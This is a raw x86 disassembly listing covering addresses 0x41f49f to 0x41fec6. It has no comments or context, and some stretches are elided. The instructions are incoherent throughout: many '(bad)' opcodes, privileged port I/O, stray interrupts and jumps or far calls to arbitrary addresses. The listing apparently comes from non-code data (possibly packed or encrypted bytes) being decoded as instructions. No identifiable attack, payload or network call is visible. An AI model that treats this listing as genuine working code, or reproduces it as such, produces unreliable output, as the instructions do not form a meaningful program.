  41f49f:	cli    
  41f4a0:	aas    
  41f4a1:	or     eax,0x2c716292
  41f4a6:	add    DWORD PTR [esi],ecx
  41f4a8:	pop    es
  41f4a9:	inc    edx
  41f4aa:	pusha  
  41f4ab:	jmp    0xac8fe5c
  41f4b0:	inc    esp
  41f4b1:	mov    eax,0xa17e4564
  41f4b6:	jp     0x41f457
  41f4b8:	add    BYTE PTR [edx-0x84b4667],al
  41f4be:	aam    0x8e
  41f4c0:	pop    ebx
  41f4c1:	mov    esi,0x2c42d292
  41f4c6:	xor    DWORD PTR [edx+0x7fa39d95],eax
  41f4cc:	cli    
  41f4cd:	inc    edx
  41f4ce:	in     eax,dx
  41f4cf:	ret    
  41f4d0:	sbb    eax,0x588c42b2
  41f4d5:	test   bh,0xfb
  41f4d8:	dec    ebp
  41f4d9:	mov    ds:0xb388cb9,eax
  41f4de:	pop    ss
  41f4df:	fcom   DWORD PTR [eax+0x69fe508b]
  41f4e6:	imul   ecx,DWORD PTR [edi],0xffffffb5
  41f4e9:	mov    ch,0xae
  41f4eb:	mov    eax,ds:0xbcceeefc
  41f4f0:	jae    0x41f501
  41f4f2:	jg     0x41f513
  41f4f4:	inc    ebp
  41f4f5:	loop   0x41f55e
  41f4f7:	add    eax,0xfa29a8b5
  41f4fc:	jmp    0x3922eb23
  41f501:	add    al,0xa6
  41f503:	jg     0x41f567
  41f505:	cmp    eax,0x3b6f5bec
  41f50a:	lods   eax,DWORD PTR ds:[esi]
  41f50b:	popf   
  41f50c:	sbb    al,0xdc
  41f50e:	mov    cl,0x58
  41f511:	std    
  41f512:	out    dx,eax
  41f513:	retf   
  41f514:	jbe    0x41f51d
  41f516:	pop    ss
  41f517:	into   
  41f518:	int    0xb9
  41f51a:	arpl   WORD PTR [ebx+eiz*2-0x14d1ca9c],cx
  41f521:	lea    ebx,[edx]
  41f523:	(bad)  [eax-0x79]
  41f526:	sub    eax,0x47ee2a9b
  41f52b:	loope  0x41f5ac
  41f52d:	or     eax,0x1995b2f3
  41f532:	ins    DWORD PTR es:[edi],dx
  41f533:	imul   edi,DWORD PTR [ebx+0x0],0x0
	...
  41f595:	add    BYTE PTR [eax+0x34],bh
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	add    DWORD PTR [eax+0x42],esi
  41f5a5:	xchg   edi,eax
  41f5a6:	inc    ebx
  41f5a7:	dec    esp
  41f5a8:	add    DWORD PTR [eax],eax
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    BYTE PTR [ebp+ebp*2-0x2059a56c],cl
  41f5b4:	pushf  
  41f5b5:	out    0x26,al
  41f5b7:	ins    BYTE PTR es:[edi],dx
  41f5b8:	mov    ebp,0xbcfd4b3a
  41f5bd:	adc    esi,edx
  41f5bf:	mov    dl,BYTE PTR [esi-0x1a471fc5]
  41f5c5:	dec    ebx
  41f5c6:	inc    esi
  41f5c7:	loope  0x41f54f
  41f5c9:	dec    edi
  41f5ca:	popf   
  41f5cb:	test   eax,0x97028e71
  41f5d0:	dec    esp
  41f5d1:	jmp    0xc321:0xda3acead
  41f5d8:	lods   al,BYTE PTR ds:[esi]
  41f5d9:	cmp    ebp,DWORD PTR [ebp-0xd]
  41f5dc:	xor    eax,0xf6afec35
  41f5e1:	inc    eax
  41f5e2:	inc    ebx
  41f5e3:	pop    edi
  41f5e4:	add    DWORD PTR [esi+0x76],ebp
  41f5e7:	out    0xf7,al
  41f5e9:	and    BYTE PTR [ebx+0x1a3bd49d],ah
  41f5ef:	mov    al,bl
  41f5f1:	push   cs
  41f5f2:	(bad)  
  41f5f3:	scas   al,BYTE PTR es:[edi]
  41f5f4:	fnstcw WORD PTR [esp+edx*2+0x682d5367]
  41f5fb:	mov    cl,ch
  41f5fd:	imul   edx,DWORD PTR [ecx-0x5f],0x8220ea45
  41f604:	jge    0x41f5e8
  41f606:	adc    cl,ch
  41f608:	or     DWORD PTR [ecx],ecx
  41f60a:	call   0xc0336b83
  41f60f:	arpl   WORD PTR [ecx],di
  41f611:	sub    BYTE PTR [ebp+eax*8-0x1aad1fb8],dl
  41f618:	and    DWORD PTR [edx],esi
  41f61a:	or     eax,0x7c3ea772
  41f61f:	mov    edi,0xfc7d5ad5
  41f624:	icebp  
  41f625:	or     dh,cl
  41f627:	adc    al,0x26
  41f629:	bound  ebx,QWORD PTR [ebp+ecx*4+0x48f46a19]
  41f630:	out    dx,eax
  41f631:	mov    edx,0x6ba336b2
  41f636:	test   edi,ebp
  41f638:	cmp    dl,BYTE PTR [eax+0x280376b4]
  41f63e:	or     al,0x64
  41f640:	inc    edi
  41f641:	dec    ebx
  41f642:	rcr    BYTE PTR ds:0x1ee0ad02,0xae
  41f649:	je     0x41f608
  41f64b:	fsub   st,st(7)
  41f64d:	(bad)  [edx+0x3d29d27e]
  41f653:	mov    eax,ds:0xc372f011
  41f658:	mov    ebx,0x80f57d5d
  41f65d:	adc    DWORD PTR ds:0x4b9f9b15,esi
  41f663:	(bad)  
  41f664:	sub    BYTE PTR [ebx+0x4871b40d],dh
  41f66a:	ret    
  41f66b:	xor    BYTE PTR [ecx-0x1d97d90b],bh
  41f671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f672:	xor    al,0xb0
  41f674:	call   0x7c51:0xd7b022a
  41f67b:	push   0x1e
  41f67d:	add    eax,0x7d80c5b1
  41f682:	push   ss
  41f683:	call   0xac76287c
  41f688:	and    al,BYTE PTR [ecx]
  41f68a:	sbb    esp,eax
  41f68c:	add    DWORD PTR [edx+eax*4+0x6d535581],esp
  41f693:	or     eax,0xc3d27f94
  41f698:	jmp    0x93d3:0xd0b49d6f
  41f69f:	mov    ah,0x1d
  41f6a1:	inc    ecx
  41f6a2:	cs xchg edi,eax
  41f6a4:	clc    
  41f6a5:	mov    ecx,0xfe4aa68d
  41f6aa:	xchg   BYTE PTR [ebx+0x57],bh
  41f6ad:	jmp    0x5ea26285
  41f6b2:	or     DWORD PTR [ecx],ecx
  41f6b4:	add    BYTE PTR es:[eax],al
	...
  41f713:	add    BYTE PTR [eax],al
  41f715:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    DWORD PTR [esi],ebp
  41f723:	mov    al,0xaf
  41f725:	das    
  41f726:	dec    edx
  41f727:	dec    ebp
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    BYTE PTR [ebx],dl
  41f72f:	push   0xb5a52e26
  41f734:	into   
  41f735:	hlt    
  41f736:	test   BYTE PTR [edi-0x51],bl
  41f739:	xor    eax,0x382866e5
  41f73e:	xor    al,0xcd
  41f740:	aam    0x80
  41f742:	push   ds
  41f743:	mov    ecx,0x3ef003b
  41f748:	adc    DWORD PTR [edx+eax*8],0xa1450589
  41f74f:	lea    ebp,[ecx-0x1a]
  41f752:	add    al,0xb0
  41f754:	sbb    BYTE PTR fs:[ebx-0x3c],0xb1
  41f759:	add    dl,BYTE PTR [ebp-0x5bdbd9d4]
  41f75f:	xchg   BYTE PTR [ecx-0xc6ce49e],dl
  41f765:	dec    DWORD PTR [ebx+0x228d53e3]
  41f76b:	popa   
  41f76c:	xor    BYTE PTR ds:0x2413a898,ch
  41f772:	jnp    0x41f7b7
  41f774:	pop    es
  41f775:	enter  0x267c,0x9b
  41f779:	jb     0x41f751
  41f77b:	test   DWORD PTR [eax],edx
  41f77d:	shl    DWORD PTR [ebp-0x19d62f45],cl
  41f783:	(bad)  
  41f784:	jecxz  0x41f722
  41f786:	repnz mov dl,0xe0
  41f789:	xor    cl,dh
  41f78b:	cmc    
  41f78c:	mov    ds:0x29ebe207,eax
  41f791:	push   ss
  41f792:	sbb    DWORD PTR [edx],ecx
  41f794:	and    al,0xb1
  41f796:	or     BYTE PTR [edx+0x15],dl
  41f799:	out    dx,al
  41f79a:	xlat   BYTE PTR ds:[ebx]
  41f79b:	add    eax,0x43a6c9b3
  41f7a0:	jle    0x41f7b4
  41f7a2:	mov    ch,0xf4
  41f7a4:	enter  0xb6a0,0xa0
  41f7a8:	call   FWORD PTR [ebp+0x49e017cb]
  41f7ae:	add    eax,0x291ca30f
  41f7b3:	xlat   BYTE PTR ds:[ebx]
  41f7b4:	sti    
  41f7b5:	adc    DWORD PTR [esi-0xc],0x22
  41f7b9:	add    esp,DWORD PTR [edx+ecx*1+0x1e0b8250]
  41f7c0:	call   0xf09c6c79
  41f7c5:	pusha  
  41f7c6:	sahf   
  41f7c7:	cmp    BYTE PTR [edx+0x3484029d],cl
  41f7cd:	loopne 0x41f82b
  41f7cf:	xchg   esi,eax
  41f7d0:	dec    edx
  41f7d1:	push   esi
  41f7d2:	ds pop edx
  41f7d4:	out    dx,al
  41f7d5:	push   ss
  41f7d6:	repnz and dh,BYTE PTR [edx-0x3d6e0487]
  41f7dd:	int3   
  41f7de:	(bad)  
  41f7e0:	push   0xffffff97
  41f7e2:	bound  edx,QWORD PTR ds:0x301347bc
  41f7e8:	repnz xchg esp,eax
  41f7ea:	imul   edi,DWORD PTR [eax-0x58f02f69],0xffffff88
  41f7f1:	push   ecx
  41f7f2:	adc    eax,0x616b68de
  41f7f7:	mov    ch,0xcf
  41f7f9:	xor    DWORD PTR [edi],edx
  41f7fb:	repnz (bad) 
  41f7fd:	fcomi  st,st(5)
  41f7ff:	inc    esp
  41f800:	xor    ah,0x3a
  41f803:	call   0xdb0f78cb
  41f808:	dec    DWORD PTR [ebp+0x629c5781]
  41f80e:	push   ebp
  41f80f:	stos   DWORD PTR es:[edi],eax
  41f810:	stc    
  41f811:	fmul   st(4),st
  41f813:	mov    ds,WORD PTR [ecx]
  41f815:	lahf   
  41f816:	inc    ecx
  41f817:	hlt    
  41f818:	adc    eax,0x958e4f20
  41f81d:	out    dx,al
  41f81e:	inc    edi
  41f81f:	fimul  WORD PTR [ebx+0x39]
  41f822:	fst    QWORD PTR [edx+0xe]
  41f825:	popa   
  41f826:	cdq    
  41f827:	jl     0x41f7b5
  41f829:	fxch   st(3)
  41f82b:	iret   
  41f82c:	in     al,0x1d
  41f82e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f82f:	or     ah,BYTE PTR [ebx]
  41f831:	pop    es
  41f832:	pop    esi
  41f833:	jo     0x41f820
	...
  41f895:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    ecx,DWORD PTR [esp+esi*2]
  41f8a4:	jmp    0x1904a4b
  41f8a9:	add    BYTE PTR [edi],al
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    BYTE PTR [edi],dh
  41f8af:	jmp    0x9798622f
  41f8b4:	ins    BYTE PTR es:[edi],dx
  41f8b5:	je     0x41f848
  41f8b7:	dec    esp
  41f8b8:	pop    edx
  41f8b9:	jl     0x41f91c
  41f8bb:	mov    dl,BYTE PTR [ecx-0x406944b5]
  41f8c1:	ins    DWORD PTR es:[edi],dx
  41f8c2:	stos   DWORD PTR es:[edi],eax
  41f8c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8c4:	push   ebx
  41f8c5:	pushf  
  41f8c6:	pushf  
  41f8c7:	jg     0x41f906
  41f8c9:	mov    edx,0x290dadb2
  41f8ce:	les    esp,FWORD PTR [edx-0x49]
  41f8d1:	in     eax,0x56
  41f8d3:	pushf  
  41f8d4:	cmp    ecx,DWORD PTR [edx+ebp*1]
  41f8d7:	cmp    DWORD PTR [edx+edx*4-0x6b],ebp
  41f8db:	xor    esp,0x21bf6b51
  41f8e1:	cmp    esp,DWORD PTR [ecx-0x1f0670d0]
  41f8e7:	mov    ecx,0x8c971f34
  41f8ec:	or     dh,al
  41f8ee:	and    ch,ch
  41f8f0:	dec    ebp
  41f8f1:	jmp    0x14cc:0x5ab66ffb
  41f8f8:	mul    BYTE PTR [esi+0x1b11e7d3]
  41f8fe:	(bad)  
  41f8ff:	cli    
  41f900:	jns    0x41f8c8
  41f902:	je     0x41f946
  41f904:	imul   ebp,DWORD PTR [esi],0x7326eb2b
  41f90a:	pop    es
  41f90b:	push   edx
  41f90c:	sbb    eax,0x4e645dd7
  41f911:	cmp    dh,bh
  41f913:	js     0x41f917
  41f915:	mov    bp,0xf3b8
  41f919:	popa   
  41f91a:	sub    DWORD PTR [eax],esi
  41f91c:	jo     0x41f946
  41f91e:	rcl    BYTE PTR [edx],0x7e
  41f921:	scas   al,BYTE PTR es:[edi]
  41f922:	push   esi
  41f923:	cld    
  41f924:	in     eax,dx
  41f925:	dec    edi
  41f926:	push   ebx
  41f927:	loope  0x41f956
  41f929:	fxch   st(0)
  41f92b:	sbb    ch,BYTE PTR [ebp+0x1f]
  41f92e:	daa    
  41f92f:	add    eax,0xad973652
  41f934:	xchg   esp,eax
  41f935:	dec    eax
  41f936:	mov    edx,0xf4529d1c
  41f93b:	push   esp
  41f93c:	jp     0x41f968
  41f93e:	mov    ah,0xe6
  41f940:	int    0x3f
  41f942:	sbb    al,0x31
  41f944:	mov    edi,0xa90689b3
  41f949:	sahf   
  41f94a:	shl    DWORD PTR [eax+0x1dc5ea7d],cl
  41f950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f951:	lahf   
  41f952:	fsubrp st(4),st
  41f954:	icebp  
  41f955:	je     0x41f968
  41f957:	xchg   ebx,eax
  41f958:	pop    ebp
  41f959:	xor    BYTE PTR [edx-0x4c74edcb],bl
  41f95f:	mov    al,ds:0xd4a17518
  41f964:	cli    
  41f965:	xchg   DWORD PTR [edx+0x4643d60a],edi
  41f96b:	pop    ds
  41f96c:	outs   dx,BYTE PTR ds:[esi]
  41f96d:	xor    BYTE PTR [eax-0x23],bh
  41f970:	je     0x41f9ea
  41f972:	lock dec edx
  41f974:	fsub   QWORD PTR [eax+0x34d2d20b]
  41f97a:	cld    
  41f97b:	mov    ebp,0x18bd28b
  41f980:	jno    0x41f9bc
  41f982:	dec    esi
  41f983:	lahf   
  41f984:	add    eax,0x56219114
  41f989:	push   es
  41f98a:	retf   0xb1a1
  41f98d:	fcomip st,st(1)
  41f98f:	fstp   DWORD PTR [esi]
  41f991:	rcr    ch,cl
  41f993:	jl     0x41f9c3
  41f995:	xchg   ebx,eax
  41f996:	icebp  
  41f997:	jno    0x41f9a9
  41f999:	jp     0x41f976
  41f99b:	out    0xcd,al
  41f99d:	jae    0x41f9e5
  41f99f:	jno    0x41f98c
  41f9a1:	mov    DWORD PTR [esi+0x28],ebx
  41f9a4:	cmc    
  41f9a5:	push   esi
  41f9a6:	cmp    DWORD PTR [edi],ecx
  41f9a8:	stos   BYTE PTR es:[edi],al
  41f9a9:	outs   dx,DWORD PTR ds:[esi]
  41f9aa:	hlt    
  41f9ab:	add    esi,ebx
  41f9ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9ae:	iret   
  41f9af:	das    
  41f9b0:	inc    edi
  41f9b1:	xchg   ebx,eax
  41f9b2:	mov    al,ds:0xab3d
	...
  41fa13:	add    BYTE PTR [eax],al
  41fa15:	add    BYTE PTR [edx],cl
  41fa17:	inc    ecx
  41fa18:	mov    bh,0xa1
  41fa1a:	push   edi
  41fa1c:	push   ds
  41fa1d:	jmp    0x41f9ba
  41fa1f:	mov    eax,0x9fe68e70
  41fa24:	push   esi
  41fa25:	neg    BYTE PTR [eax+0x4f]
  41fa28:	add    DWORD PTR [eax],eax
  41fa2a:	pop    es
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    BYTE PTR [edx+0x56d5f66d],dh
  41fa33:	adc    al,0x40
  41fa35:	cmp    bh,bh
  41fa37:	in     al,0xfc
  41fa39:	jle    0x41fa19
  41fa3b:	mov    bh,0x34
  41fa3d:	enter  0x7be7,0xaa
  41fa41:	shl    DWORD PTR [ecx+0x20],cl
  41fa44:	sar    BYTE PTR [edx+edx*8+0x73a7cb02],cl
  41fa4b:	int3   
  41fa4c:	push   esi
  41fa4d:	pop    eax
  41fa4e:	cdq    
  41fa4f:	out    dx,eax
  41fa50:	jecxz  0x41facb
  41fa52:	pop    esi
  41fa53:	repz scas al,BYTE PTR es:[edi]
  41fa55:	cs pop ebp
  41fa57:	out    dx,al
  41fa58:	je     0x41fa67
  41fa5a:	jmp    0x41fa71
  41fa5c:	leave  
  41fa5d:	or     DWORD PTR [edi],esi
  41fa5f:	mov    bh,0xda
  41fa61:	or     esi,edi
  41fa63:	in     eax,dx
  41fa64:	mov    esi,0xf7bbdc54
  41fa69:	outs   dx,DWORD PTR ds:[esi]
  41fa6a:	cld    
  41fa6b:	(bad)  
  41fa6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa6d:	mov    eax,0xc9e6fd81
  41fa72:	mov    dl,0x42
  41fa74:	mov    dh,BYTE PTR [ebp-0x6f]
  41fa77:	inc    ebp
  41fa78:	mov    ah,0x27
  41fa7a:	xchg   ecx,eax
  41fa7b:	dec    ebp
  41fa7c:	add    edi,DWORD PTR [eax]
  41fa7e:	(bad)  
  41fa7f:	lahf   
  41fa80:	rcr    esp,0x61
  41fa83:	add    al,BYTE PTR [edx-0x2284c5df]
  41fa89:	or     ah,dh
  41fa8b:	mov    dh,al
  41fa8d:	or     al,ah
  41fa8f:	push   0x20
  41fa91:	test   al,0xbb
  41fa93:	or     eax,0x8586b43
  41fa98:	(bad)  
  41fa99:	xchg   ecx,eax
  41fa9a:	shl    BYTE PTR [eax+edi*4],1
  41fa9d:	imul   esi,ebp,0x73
  41faa0:	int3   
  41faa1:	js     0x41fa99
  41faa3:	pop    ebp
  41faa4:	lock xchg DWORD PTR [ebp+eiz*2-0x58],edi
  41faa9:	sub    bl,0x7
  41faac:	rol    DWORD PTR [ecx-0x65],cl
  41faaf:	add    ch,dl
  41fab1:	xchg   edi,eax
  41fab2:	test   al,0x1
  41fab4:	pop    ebx
  41fab5:	mov    ah,0x16
  41fab7:	repnz dec ebx
  41fab9:	mov    dh,0x40
  41fabb:	ret    0xf687
  41fabe:	fs mov ebx,0x75e0a378
  41fac4:	xchg   ebx,eax
  41fac5:	fprem  
  41fac7:	mov    ebp,0x19a9ad70
  41facc:	jl     0x41fad0
  41face:	aaa    
  41facf:	mov    BYTE PTR [edx+0x76],dh
  41fad2:	sub    DWORD PTR [esi],esp
  41fad4:	jae    0x41fab7
  41fad6:	xor    DWORD PTR [ecx-0x8],ebx
  41fad9:	call   0xee03:0x21cdc88e
  41fae0:	loopne 0x41fae8
  41fae2:	in     eax,0xe9
  41fae4:	add    bh,ch
  41fae6:	inc    esi
  41fae7:	and    al,0xf5
  41fae9:	out    dx,eax
  41faea:	jmp    0x41fb1b
  41faec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faed:	out    dx,eax
  41faee:	iret   
  41faef:	imul   esi,DWORD PTR [edx+0x17],0x34e0da43
  41faf6:	jp     0x41faf4
  41faf8:	int3   
  41faf9:	sbb    edx,0x6e
  41fafc:	or     ecx,DWORD PTR [esi-0x31d4b88]
  41fb02:	repz ret 
  41fb04:	xchg   BYTE PTR [esi-0x62],dl
  41fb07:	scas   eax,DWORD PTR es:[edi]
  41fb08:	xchg   ebx,eax
  41fb09:	iret   
  41fb0a:	mov    es,WORD PTR ds:0xd9a77cfa
  41fb10:	ins    BYTE PTR es:[edi],dx
  41fb11:	cmp    esp,esi
  41fb13:	mov    dh,0x33
  41fb15:	(bad)  [edx+0x59e17cb6]
  41fb1b:	xor    eax,0xea781766
  41fb20:	arpl   WORD PTR [ebx+0x4a4df098],dx
  41fb26:	pop    ebp
  41fb27:	mov    eax,0xa475c907
  41fb2c:	(bad)  
  41fb2d:	mov    ds:0xe60abe50,al
  41fb32:	(bad)  
  41fb33:	adc    DWORD PTR [ecx+0x0],eax
	...
  41fb95:	add    ah,bl
  41fb97:	sub    BYTE PTR [edx-0x119011c],cl
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0xd1
  41fba3:	pop    ss
  41fba4:	bound  edx,QWORD PTR [ecx+0x1505f]
  41fbaa:	pop    es
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    cl,dl
  41fbaf:	sub    al,0x77
  41fbb1:	mov    BYTE PTR [esi+0x606627b3],dl
  41fbb7:	mov    cs,WORD PTR [ebx-0x506154f4]
  41fbbd:	mov    ah,0x3f
  41fbbf:	xor    DWORD PTR [ebx+eax*8+0x4c],ebx
  41fbc3:	aaa    
  41fbc4:	(bad)  
  41fbc5:	fwait
  41fbc6:	imul   edx,edi,0x24bd8832
  41fbcc:	out    dx,eax
  41fbcd:	loope  0x41fb9c
  41fbcf:	push   0xffffffb4
  41fbd1:	and    BYTE PTR [esi],0x2d
  41fbd4:	int    0x8d
  41fbd6:	jae    0x41fc4c
  41fbd8:	xchg   BYTE PTR [ebp-0x7bf15ed8],bl
  41fbde:	and    esp,ebx
  41fbe0:	mov    dh,0xa5
  41fbe2:	xor    bh,dl
  41fbe4:	jbe    0x41fb96
  41fbe6:	mov    al,ds:0x719db3dc
  41fbeb:	sti    
  41fbec:	jecxz  0x41fc01
  41fbee:	ins    BYTE PTR es:[edi],dx
  41fbef:	lods   eax,DWORD PTR ds:[esi]
  41fbf0:	add    eax,0xb3b53855
  41fbf5:	int    0x90
  41fbf7:	add    bh,BYTE PTR [eax+0x6a]
  41fbfa:	and    cl,bl
  41fbfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbfd:	test   BYTE PTR [edx],al
  41fbff:	pop    ds
  41fc00:	or     edx,DWORD PTR [edx+eiz*4+0x21]
  41fc04:	adc    DWORD PTR [edx+0x74dd56d],ecx
  41fc0a:	jne    0x41fc04
  41fc0c:	push   ebp
  41fc0d:	gs fwait
  41fc0f:	mov    dl,BYTE PTR [edx+esi*4+0x22]
  41fc13:	lods   al,BYTE PTR ds:[esi]
  41fc14:	jnp    0x41fc6f
  41fc16:	mov    dh,0xc5
  41fc18:	adc    eax,0x656c1275
  41fc1d:	lds    edi,FWORD PTR [esi]
  41fc1f:	jo     0x41fc47
  41fc21:	push   ecx
  41fc22:	loopne 0x41fc7d
  41fc24:	jl     0x41fc74
  41fc26:	hlt    
  41fc27:	aaa    
  41fc28:	mov    WORD PTR [ecx],?
  41fc2a:	cmp    eax,0x2acaea75
  41fc2f:	sub    BYTE PTR [eax+0x736d5570],bh
  41fc35:	mov    edi,0xd758c39f
  41fc3a:	pop    eax
  41fc3b:	mov    edx,DWORD PTR [edx-0xabd2bce]
  41fc41:	shl    esp,0xcd
  41fc44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc45:	ja     0x41fbc9
  41fc47:	adc    ebx,DWORD PTR [esi+0x5fbcc653]
  41fc4d:	or     al,0xfb
  41fc4f:	mov    DWORD PTR [edi],ecx
  41fc51:	inc    ecx
  41fc52:	sbb    ch,al
  41fc54:	cli    
  41fc55:	outs   dx,DWORD PTR ds:[esi]
  41fc56:	cwde   
  41fc57:	daa    
  41fc58:	sbb    ebp,DWORD PTR ds:0x30533e45
  41fc5e:	sub    al,0xb2
  41fc60:	neg    BYTE PTR [ebx-0x22]
  41fc63:	xor    bl,bh
  41fc65:	mov    eax,0x555ba4c7
  41fc6a:	cwde   
  41fc6b:	retf   
  41fc6c:	and    DWORD PTR [eax+0x20],ecx
  41fc6f:	mov    eax,0x937b703e
  41fc74:	fild   QWORD PTR [edx]
  41fc76:	jmp    0xb464:0x16cf
  41fc7c:	push   ebp
  41fc7d:	clc    
  41fc7e:	cmove  edi,DWORD PTR ds:0x911c2718
  41fc85:	repz loop 0x41fc52
  41fc88:	mov    BYTE PTR [eax+0x5c],ch
  41fc8b:	(bad)  
  41fc8c:	jl     0x41fcad
  41fc8e:	sbb    edi,0x8482d86c
  41fc94:	fistp  DWORD PTR ds:0x3c5142d
  41fc9a:	dec    esp
  41fc9b:	xor    BYTE PTR [ebx-0x20],al
  41fc9e:	and    DWORD PTR [esi-0x1463eb75],ebp
  41fca4:	push   ebp
  41fca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fca6:	aas    
  41fca7:	xor    ah,BYTE PTR [edx-0x11b4002]
  41fcad:	fist   WORD PTR [edx-0x72422189]
  41fcb3:	lods   al,BYTE PTR ds:[esi]
  41fcb4:	adc    al,BYTE PTR [eax]
	...
  41fd16:	or     al,0x6a
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	mov    ecx,0x660ff8e3
  41fd27:	push   ecx
  41fd28:	add    DWORD PTR [eax],eax
  41fd2a:	pop    es
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    BYTE PTR [ebx],cl
  41fd2f:	arpl   WORD PTR [ebp-0x30],bp
  41fd32:	ret    0xc202
  41fd35:	push   ecx
  41fd36:	popa   
  41fd37:	mov    ch,0xb9
  41fd39:	dec    edi
  41fd3a:	loopne 0x41fd2e
  41fd3c:	stos   BYTE PTR es:[edi],al
  41fd3d:	xor    bl,BYTE PTR [ecx-0x54ff663c]
  41fd43:	stos   WORD PTR es:[edi],ax
  41fd45:	sbb    ecx,DWORD PTR [ecx]
  41fd47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd48:	lods   al,BYTE PTR ds:[esi]
  41fd49:	jp     0x41fd2c
  41fd4b:	repnz inc esi
  41fd4d:	sbb    eax,0xdea40804
  41fd52:	pop    esi
  41fd53:	sar    DWORD PTR [edx],0xc3
  41fd56:	sbb    eax,0x6f89684d
  41fd5b:	leave  
  41fd5c:	mov    ecx,ebx
  41fd5e:	or     eax,0x2b668fd1
  41fd63:	mov    ds:0x1042d85a,al
  41fd68:	cld    
  41fd69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd6a:	xor    DWORD PTR ds:0xbd512bb1,esi
  41fd70:	addr16 push 0xfc0d349c
  41fd76:	test   al,0x91
  41fd78:	pop    ds
  41fd79:	cmc    
  41fd7a:	mov    WORD PTR [edi-0x4e],ss
  41fd7d:	scas   al,BYTE PTR es:[edi]
  41fd7e:	mul    DWORD PTR [edx+edx*8+0x6e2e5cc7]
  41fd85:	push   ebp
  41fd86:	dec    edx
  41fd87:	and    DWORD PTR [edx-0x3b],esp
  41fd8a:	test   BYTE PTR [edx-0xbf24133],0x10
  41fd91:	adc    BYTE PTR [edi+0x7324ebc0],0xf3
  41fd98:	(bad)  
  41fd99:	arpl   WORD PTR [ecx+0x3b8dea2b],cx
  41fd9f:	retf   0x8f22
  41fda2:	les    eax,FWORD PTR ds:0xe70f5c69
  41fda8:	sbb    ebp,DWORD PTR [ebx-0x24]
  41fdab:	std    
  41fdac:	adc    DWORD PTR [esp+eiz*4+0xa],edx
  41fdb0:	pushw  0xee5d
  41fdb4:	jmp    0x8e00:0x1c000cca
  41fdbb:	out    0x5,eax
  41fdbd:	ficomp WORD PTR [ebx+0x7f]
  41fdc0:	jp     0x41fdae
  41fdc2:	jecxz  0x41fe02
  41fdc4:	hlt    
  41fdc5:	mov    ds:0x690d39bd,eax
  41fdca:	jbe    0x41fe18
  41fdcc:	fstp   DWORD PTR [esi]
  41fdce:	pop    ss
  41fdcf:	pusha  
  41fdd0:	dec    edx
  41fdd1:	test   BYTE PTR [ebx-0x168298c9],0x50
  41fdd8:	push   ecx
  41fdd9:	mov    esi,edi
  41fddb:	jg     0x41fe1d
  41fddd:	ss mov ah,0xd3
  41fde0:	dec    esp
  41fde1:	stos   BYTE PTR es:[edi],al
  41fde2:	mov    edi,fs
  41fde4:	xchg   esp,eax
  41fde5:	push   ecx
  41fde6:	into   
  41fde7:	jg     0x41fe61
  41fde9:	ds mov ecx,0x60c4290b
  41fdef:	popa   
  41fdf0:	adc    eax,0x4024562c
  41fdf5:	popf   
  41fdf6:	ret    
  41fdf7:	loop   0x41fe15
  41fdf9:	xchg   ebp,eax
  41fdfa:	or     eax,0x480a6e5e
  41fe00:	lds    esi,FWORD PTR [ecx+0x21]
  41fe03:	mov    al,ds:0xd070b78a
  41fe08:	mov    WORD PTR [edx-0x1ec0dc58],gs
  41fe0e:	ins    DWORD PTR es:[edi],dx
  41fe0f:	or     eax,0xeea79b43
  41fe14:	mov    eax,0x95ffb225
  41fe19:	xor    al,0x7f
  41fe1b:	lea    ebx,[ecx]
  41fe1d:	mov    edi,0x6cdbc58b
  41fe22:	sub    eax,0x152dd1d5
  41fe27:	add    al,0xeb
  41fe29:	cld    
  41fe2a:	jp     0x41fdca
  41fe2c:	push   ds
  41fe2d:	push   ss
  41fe2e:	add    BYTE PTR [edx-0xdcda8c],dl
  41fe34:	adc    BYTE PTR [eax],al
	...
  41fe96:	stos   BYTE PTR es:[edi],al
  41fe97:	push   ebp
  41fe98:	call   0x515d:0xffefffe7
  41fe9f:	lock xor DWORD PTR [edi+0x2a],0x7b
  41fea4:	gs mov eax,0x1526d
  41feaa:	pop    es
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    BYTE PTR [esp+esi*2-0x5d0faa42],dl
  41feb4:	shr    dl,1
  41feb6:	repnz pop eax
  41feb8:	js     0x41fea2
  41feba:	mov    esp,esp
  41febc:	sub    eax,0x785a7ef6
  41fec1:	fcomp  st(0)
  41fec3:	pop    ds
  41fec4:	popf   
  41fec5:	fwait
  41fec6:	xor    cl,dl
